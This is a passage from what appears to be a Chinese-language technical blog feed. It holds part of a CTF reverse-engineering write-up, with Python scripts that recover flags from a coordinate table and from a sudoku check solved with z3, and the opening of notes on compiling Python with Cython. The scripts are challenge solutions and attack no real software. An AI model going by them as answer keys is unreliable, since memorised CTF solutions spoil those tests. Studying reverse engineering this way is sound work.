class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>)]<br>flagPos = <span class="hljs-number">0</span><br>realPos = <span class="hljs-number">0</span><br>v7 = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(target), <span class="hljs-number">2</span>):<br>    step1 = target[i][<span class="hljs-number">0</span>]<br>    step2 = target[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>]<br>    flagPos = i // <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">if</span> step1 == -<span class="hljs-number">1</span>:<br>        step1 = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> step2 == -<span class="hljs-number">1</span>:<br>        step2 = <span class="hljs-number">0</span><br><br>    FindAns = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(alpha)):<br>        v7 = (flagPos + idx // <span class="hljs-number">6</span>) % <span class="hljs-number">6</span><br>        v6 = <span class="hljs-number">5</span> - (idx + flagPos) % <span class="hljs-number">6</span><br>        <span class="hljs-keyword">if</span> v6 == step1 <span class="hljs-keyword">and</span> v7 == step2:<br>            FindAns = idx<br><br>    flag += alpha[FindAns]<br>print(flag)<br></code></pre></td></tr></table></figure><h2 id="第四题-英雄救美"><a href="#第四题-英雄救美" class="headerlink" title="第四题 英雄救美"></a>第四题 英雄救美</h2><p>sub_391240 对输入数据进行转换<br>这个函数有点小坑…..</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">table1 = [<span class="hljs-number">0x24</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x71</span>]<br></code></pre></td></tr></table></figure><p>$B$BP =&gt; 12123</p><p>sub_391000  9x9 数独 check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">map1 = [<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000000</span>]<br><br>mat = []<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    line = <span class="hljs-built_in">list</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        line.append(map1[y * <span class="hljs-number">9</span> + x])<br>    mat.append(line)<br></code></pre></td></tr></table></figure><p>数独输出如下</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">9 </span><span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">8 </span><span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">9</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-number">0</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>用 z3 脚本解一下数独</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">X = [ [ Int(<span class="hljs-string">&quot;x_%s_%s&quot;</span> % (i+<span class="hljs-number">1</span>, j+<span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ] <br>      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>cells_c  = [ And(<span class="hljs-number">1</span> &lt;= X[i][j], X[i][j] &lt;= <span class="hljs-number">9</span>) <br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>rows_c   = [ Distinct(X[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>cols_c   = [ Distinct([ X[i][j] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]) <br>             <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>sq_c     = [ Distinct([ X[<span class="hljs-number">3</span>*i0 + i][<span class="hljs-number">3</span>*j0 + j] <br>                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ]) <br>             <span class="hljs-keyword">for</span> i0 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j0 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ]<br><br>sudoku_c = cells_c + rows_c + cols_c + sq_c<br><br>instance = [[<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>],<br> [<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>],<br> [<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>]]<br><br>instance_c = [ If(instance[i][j] == <span class="hljs-number">0</span>, <br>                  <span class="hljs-literal">True</span>, <br>                  X[i][j] == instance[i][j]) <br>               <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>s = Solver()<br>s.add(sudoku_c + instance_c)<br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    r = [ [ m.evaluate(X[i][j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ] <br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br>    print_matrix(r)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;failed to solve&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">result = [[<span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>],<br> [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>],<br> [<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>],<br> [<span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>],<br> [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>],<br> [<span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>],<br> [<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>],<br> [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>],<br> [<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]]<br></code></pre></td></tr></table></figure><p>反推输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">dict_map = &#123;&#125;<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(table1)):<br>    kk = k % <span class="hljs-number">9</span> + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> kk <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dict_map:<br>        dict_map[kk] = []<br>    dict_map[kk].append(table1[k])<br><br><span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> dict_map:<br>    print(kk, dict_map[kk])<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    cnt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> instance[y][x] == <span class="hljs-number">0</span>:<br>            flag = flag + <span class="hljs-built_in">chr</span>(dict_map[result[y][x]][y])<br>            cnt = cnt + <span class="hljs-number">1</span> <br>    flag = flag + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>) - cnt)<br>print(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cython Reverse</title>
    <link href="/2021/05/07/Cython-Reverse/"/>
    <url>/2021/05/07/Cython-Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="Cython-Reverse-notes"><a href="#Cython-Reverse-notes" class="headerlink" title="Cython Reverse notes"></a>Cython Reverse notes</h1><p>Cython 是什么呢？官方给出的解释是 Cython 是一种新的语言，是带类型的 Python [1]。</p><p>Cython 有一个功能叫 <code>Cythonize</code> 这个功能可以将 Python 编译成 C语言实现，再由 GCC/Clang 将 C 编译成动态库。</p><p>setup.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup<br><span class="hljs-keyword">from</span> Cython.Build <span class="hljs-keyword">import</span> cythonize<br><br>setup(<br>    ext_modules = cythonize(<span class="hljs-string">&quot;hello.pyx&quot;</span>, annotate=<span class="hljs-literal">True</span>)<br>)<br></code></pre></td></tr></table></figure><p>annotate=True 选项可以生成一个 html 页面，用于显示 Py源码与生成的C代码的对应关系。</p><p>build 命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> build_ext --inplace<br></code></pre></td></tr></table></figure><p>Build 成功后，可以在当前目录下找到对应的动态库与对应的 xxx.c 源文件。此时可以直接用 python import 导入（就像导入编译之前的那样）</p><p>Cythonize 好处是编译成本地代码后执行效率可以提高，缺点是不太好<code>逆向</code></p><p>本文分析基于 Python 3.7.6，Cython 0.29.21</p><p>本文基于 Hello.py 编译成的动态库分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 